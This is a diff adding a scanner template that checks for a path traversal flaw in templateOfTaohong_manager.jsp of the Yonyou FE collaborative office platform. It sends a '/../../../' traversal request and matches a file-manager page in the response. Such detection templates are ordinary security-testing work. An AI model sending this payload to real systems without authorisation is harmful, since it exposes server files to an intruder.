@@ -1,0 +1,25 @@
+id: yonyou-fe-directory-traversal
+brief:
+    title: FE collaborative Office templateOfTaohong_manager.jsp - Path Traversal
+    by: SleepingBag945
+    level: medium
+    about: There is a directory traversal vulnerability in the templateOfTaohong_manager.jsp file of UFIDA FE collaborative office platform. Through the vulnerability, attackers can obtain directory files and...
+    label:
+        - yonyou
+        - fe
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../'
+      signs:
+        - "on": word
+          has:
+            - window.location="templateOfTaohong_manager.jsp?path="
+            - var next=window.confirm("确定删除文件吗？");
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
